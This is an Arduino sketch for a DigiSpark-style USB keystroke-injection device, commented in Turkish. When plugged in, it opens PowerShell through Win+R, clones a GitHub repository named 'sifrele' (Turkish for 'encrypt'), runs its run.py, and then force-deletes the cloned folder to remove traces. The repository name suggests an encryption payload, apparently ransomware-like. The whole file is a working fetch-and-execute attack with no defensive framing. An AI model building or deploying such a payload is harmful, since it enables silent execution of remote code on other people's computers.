#include "DigiCombo.h"

void setup() {
    DigiCombo.begin();
    DigiCombo.delay(3000);

    // 1️⃣ Win + R tuş kombinasyonu
    DigiCombo.sendKeyStroke(0x15, 0x08);  // Win + R
    DigiCombo.delay(1000);

    // 2️⃣ PowerShell aç
    DigiCombo.println("powershell");
    DigiCombo.sendKeyStroke(0x28);  // ENTER
    DigiCombo.delay(2000);

    // 3️⃣ Ana dizine git
    DigiCombo.println("cd C:\\Users\\pc\\Desktop\\youtube");
    DigiCombo.sendKeyStroke(0x28);  // ENTER
    DigiCombo.delay(500);

    // 5️⃣ GitHub'dan repo klonla
    DigiCombo.println("git clone https://github.com/polatAI/sifrele");
    DigiCombo.sendKeyStroke(0x28);  // ENTER
    DigiCombo.delay(5000);  // Klonlama için süre ver

    // 6️⃣ Klonlanan klasöre gir
    DigiCombo.println("Set-Location sifrele");
    DigiCombo.sendKeyStroke(0x28);  // ENTER
    DigiCombo.delay(500);

    // 7️⃣ Python dosyasını çalıştır
    DigiCombo.println("python run.py");
    DigiCombo.sendKeyStroke(0x28);  // ENTER
    DigiCombo.delay(5000);

    DigiCombo.println("cd ..");
    DigiCombo.sendKeyStroke(0x28);

    // 8️⃣ Şifreleme klasörünü güvenli şekilde sil (PowerShell komutu ile)
    DigiCombo.println("Remove-Item -Recurse -Force C:\\Users\\pc\\Desktop\\youtube\\sifrele");
    DigiCombo.sendKeyStroke(0x28);  // ENTER
    DigiCombo.delay(5000);  // İşlem sürebilir

    // 9️⃣ İşlem tamamlandı mesajı
    DigiCombo.println("Write-Host 'Tamamlandi'");
    DigiCombo.sendKeyStroke(0x28);  // ENTER
}

void loop() {}
